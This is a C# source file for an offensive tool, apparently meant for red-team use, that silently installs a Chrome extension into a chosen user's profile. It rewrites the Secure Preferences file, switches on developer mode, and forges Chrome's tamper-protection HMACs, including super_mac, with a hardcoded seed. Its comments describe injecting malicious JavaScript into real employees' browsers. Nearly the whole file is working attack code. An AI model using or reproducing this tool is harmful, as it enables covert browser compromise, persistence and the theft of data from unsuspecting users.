using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Security.Cryptography;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

/*
 *  TODO: Maybe have extension_template embedded in assembly?
 *  
 *  TODO: 
 *  1. extension_template embedded into the C# 
 *  2. Logic for Preference (domain user) vs. Secure Preference (local user) 
 *  3. Option to inject into existing extension -> I... have no idea how to do this tbh, so... not sure 
 *      - Also, how the fuck do we clean up/revert this? Like, when executing this in real world red team against real employees... 
 *      - How do we uninject(?) malicious javascript code from existing extensions? 
 *      - Any availability issues? Like, end user's extension going boink? 
 *  
 *  .\SharpSilentChrome.exe /user:"root" /sid:S-1-5-21-2888908146-1342698428-1910144870-1001 /path:"C:\Users\Public\Downloads\extension"
 */
class SharpSilentChrome
{
    static void Main(string[] args)
    {
        string user = null, sid = null, extensionPath = null;

        foreach (var arg in args)
        {
            if (arg.StartsWith("/user:", StringComparison.OrdinalIgnoreCase))
                user = arg.Substring(6).Trim('"');
            else if (arg.StartsWith("/sid:", StringComparison.OrdinalIgnoreCase))
                sid = arg.Substring(5).Trim('"');
            else if (arg.StartsWith("/path:", StringComparison.OrdinalIgnoreCase))
                extensionPath = arg.Substring(6).Trim('"');
            else if (arg.Equals("/?", StringComparison.OrdinalIgnoreCase) || arg.Equals("/help", StringComparison.OrdinalIgnoreCase))
            {
                ShowUsage();
                return;
            }
        }

        if (string.IsNullOrWhiteSpace(user) || string.IsNullOrWhiteSpace(sid) || string.IsNullOrWhiteSpace(extensionPath))
        {
            ShowUsage();
            return;
        }

        var extensionId = GetExtensionId(extensionPath);

        Console.WriteLine($"Using User: {user}");
        Console.WriteLine($"Using SID: {sid}");
        Console.WriteLine($"Using Extension Path: {extensionPath}");
        Console.WriteLine($"Using ExtID: {extensionId}");

        var securePrefsFilePath = GetSecurePreferencesPathFromSid(sid);
        if (securePrefsFilePath == null)
        {
            Console.WriteLine("[-] Could not find Chrome Secure Preferences file");
            return;
        }

        // Update the sid so that it removes the last "-" part of the sid 
        sid = sid.Substring(0, sid.LastIndexOf('-'));
        AddExtension(user, sid, extensionPath, extensionId, securePrefsFilePath);
    }

    static void ShowUsage()
    {
        Console.WriteLine("Usage: SharpSilentChrome.exe /user:<username> /sid:<SID> /path:<extension_path>");
        Console.WriteLine("Example: SharpSilentChrome.exe /user:john /sid:S-1-5-21-1234567890-1234567890-1234567890-1000 /path:\"C:\\extensions\\myextension\"");
    }


    // Local user - secure preferences, domain users - preferences
    static string GetSecurePreferencesPathFromSid(string sid)
    {
        try
        {
            string regPath = $@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{sid}";
            object profileImagePath = Microsoft.Win32.Registry.GetValue(regPath, "ProfileImagePath", null);

            if (profileImagePath == null)
            {
                Console.WriteLine($"[-] Could not find profile path for SID: {sid}");
                return null;
            }

            string userProfilePath = profileImagePath.ToString();
            string securePrefsPath = Path.Combine(userProfilePath, @"AppData\Local\Google\Chrome\User Data\Default\Secure Preferences");

            if (!File.Exists(securePrefsPath))
            {
                Console.WriteLine($"[-] Secure Preferences file does not exist at: {securePrefsPath}");
                return null;
            }

            Console.WriteLine($"[+] Found user profile: {userProfilePath}");
            Console.WriteLine($"[+] Chrome Secure Preferences path: {securePrefsPath}");

            return securePrefsPath;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error resolving SID {sid}: {ex.Message}");
            return null;
        }
    }


    static void RemoveEmpty(JToken token)
    {
        if (token.Type == JTokenType.Object)
        {
            var properties = token.Children<JProperty>().ToList();
            foreach (var prop in properties)
            {
                var val = prop.Value;
                RemoveEmpty(val);

                if (val.Type == JTokenType.Object && !val.HasValues)
                    prop.Remove();
                else if (val.Type == JTokenType.Array && !val.HasValues)
                    prop.Remove();
                else if (val.Type == JTokenType.String && string.IsNullOrEmpty(val.ToString()))
                    prop.Remove();
                else if ((val.Type == JTokenType.Null ||
                          (val.Type == JTokenType.Boolean && val.ToObject<bool>() == false) ||
                          (val.Type == JTokenType.Integer && val.ToObject<long>() == 0)) && val.Type != JTokenType.Boolean && val.Type != JTokenType.Integer)
                    prop.Remove();
            }
        }
        else if (token.Type == JTokenType.Array)
        {
            var items = token.Children().ToList();
            foreach (var item in items)
            {
                RemoveEmpty(item);

                if ((item.Type == JTokenType.Object || item.Type == JTokenType.Array) && !item.HasValues)
                    item.Remove();
                else if (item.Type == JTokenType.String && string.IsNullOrEmpty(item.ToString()))
                    item.Remove();
                else if ((item.Type == JTokenType.Null ||
                          (item.Type == JTokenType.Boolean && item.ToObject<bool>() == false) ||
                          (item.Type == JTokenType.Integer && item.ToObject<long>() == 0)) && item.Type != JTokenType.Boolean && item.Type != JTokenType.Integer)
                    item.Remove();
            }
        }
    }

    static string CalculateHMAC(JToken value, string path, string sid, byte[] seed)
    {
        // 1. Prune empty objects/arrays (same as Python removeEmpty)
        if (value.Type == JTokenType.Object || value.Type == JTokenType.Array)
            RemoveEmpty(value);

        // 2. Serialize like Python: compact JSON with ensure_ascii=False equivalent
        string json = JsonConvert.SerializeObject(value, new JsonSerializerSettings
        {
            Formatting = Newtonsoft.Json.Formatting.None,
            StringEscapeHandling = StringEscapeHandling.Default // Don't escape non-ASCII
        });

        // 3. Apply the same replacements as Python
        json = json.Replace("<", "\\u003C").Replace("\\u2122", "™");

        // 4. Build message and compute HMAC (same as Python)
        string message = sid + path + json;

        // Debug: show bytes like Python does
        var messageBytes = Encoding.UTF8.GetBytes(message);

        using (var hmac = new HMACSHA256(seed))
        {
            byte[] hash = hmac.ComputeHash(messageBytes);
            var result = BitConverter.ToString(hash).Replace("-", "").ToUpperInvariant();
            return result;
        }
    }

    static string CalculateChromeDevMac(byte[] seed, string sid, string prefPath, object prefValue)
    {
        var serialized = JsonConvert.SerializeObject(prefValue, new JsonSerializerSettings
        {
            Formatting = Newtonsoft.Json.Formatting.None
        });

        var input = Encoding.UTF8.GetBytes(sid + prefPath + serialized);
        using (var hmac = new HMACSHA256(seed))
        {
            var hash = hmac.ComputeHash(input);
            return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
        }
    }

    static string CalcSuperMac(string filePath, string sid, byte[] seed)
    {
        var text = File.ReadAllText(filePath, Encoding.UTF8);
        var data = JObject.Parse(text);
        var macs = data["protection"]["macs"];

        // Serialize like Python: compact JSON with no spaces
        var json = JsonConvert.SerializeObject(macs, new JsonSerializerSettings
        {
            Formatting = Newtonsoft.Json.Formatting.None
        }).Replace(" ", "");

        var msg = sid + json;
        using (var hmac = new HMACSHA256(seed))
        {
            var hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(msg));
            return BitConverter.ToString(hash).Replace("-", "").ToUpperInvariant();
        }
    }

    static string GetExtensionId(string path)
    {
        var bytes = Encoding.Unicode.GetBytes(path);
        using (var sha = SHA256.Create())
        {
            var hash = sha.ComputeHash(bytes);
            var hex = BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
            var sb = new StringBuilder();
            foreach (var c in hex)
            {
                int val = Convert.ToInt32(c.ToString(), 16);
                sb.Append((char)(val + 'a'));
                if (sb.Length == 32) break;
            }
            return sb.ToString();
        }
    }

    static void SafeSet(JObject parent, string key, JObject defaultValue, out JObject result)
    {
        if (parent[key] is JObject obj)
            result = obj;
        else
        {
            parent[key] = defaultValue;
            result = defaultValue;
        }
    }

    static void AddExtension(string user, string sid, string extensionPath, string extensionId, string securePrefsFilePath)
    {
        Console.WriteLine($"[+] Trimmed sid: {sid}");

        var escaped = JsonConvert.ToString(extensionPath).Trim('"');
        var template = File.ReadAllText("extension_template.json");
        var extJson = template.Replace("__EXTENSION_PATH__", escaped);
        var dictExt = JObject.Parse(extJson);

        var content = File.ReadAllText(securePrefsFilePath, Encoding.UTF8);
        var data = JObject.Parse(content);

        // Enable dev mode
        SafeSet(data, "extensions", new JObject(), out var ext);
        SafeSet(ext, "ui", new JObject(), out var ui);
        ui["developer_mode"] = true;

        // Add extension settings
        SafeSet(ext, "settings", new JObject(), out var settings);
        settings[extensionId] = dictExt;

        // MACs - exact same seed as Python
        var seed = new byte[] {
        0xe7, 0x48, 0xf3, 0x36, 0xd8, 0x5e, 0xa5, 0xf9, 0xdc, 0xdf, 0x25, 0xd8, 0xf3, 0x47, 0xa6, 0x5b,
        0x4c, 0xdf, 0x66, 0x76, 0x00, 0xf0, 0x2d, 0xf6, 0x72, 0x4a, 0x2a, 0xf1, 0x8a, 0x21, 0x2d, 0x26,
        0xb7, 0x88, 0xa2, 0x50, 0x86, 0x91, 0x0c, 0xf3, 0xa9, 0x03, 0x13, 0x69, 0x68, 0x71, 0xf3, 0xdc,
        0x05, 0x82, 0x37, 0x30, 0xc9, 0x1d, 0xf8, 0xba, 0x5c, 0x4f, 0xd9, 0xc8, 0x84, 0xb5, 0x05, 0xa8
        };

        //Console.WriteLine($"[DEBUG] Seed bytes: {BitConverter.ToString(seed)}");

        var path = $"extensions.settings.{extensionId}";
        var mac = CalculateHMAC(dictExt, path, sid, seed);

        SafeSet(data, "protection", new JObject(), out var protection);
        SafeSet(protection, "macs", new JObject(), out var macs);
        SafeSet(macs, "extensions", new JObject(), out var extMacs);
        SafeSet(extMacs, "settings", new JObject(), out var settingsMac);
        settingsMac[extensionId] = mac;
        Console.WriteLine($"[+] Extension HMAC: {mac}");

        var devMac = CalculateChromeDevMac(seed, sid, "extensions.ui.developer_mode", true);
        SafeSet(extMacs, "ui", new JObject(), out var uiMac);
        uiMac["developer_mode"] = devMac;
        Console.WriteLine($"[+] Dev mode protection HMAC: {devMac}");

        // Write once
        File.WriteAllText(securePrefsFilePath, data.ToString(Newtonsoft.Json.Formatting.None), Encoding.UTF8);

        // Update super_mac
        var super = CalcSuperMac(securePrefsFilePath, sid, seed);
        protection["super_mac"] = super;
        File.WriteAllText(securePrefsFilePath, data.ToString(Newtonsoft.Json.Formatting.None), Encoding.UTF8);
        Console.WriteLine($"[+] Super_MAC: {super}");
    }
}

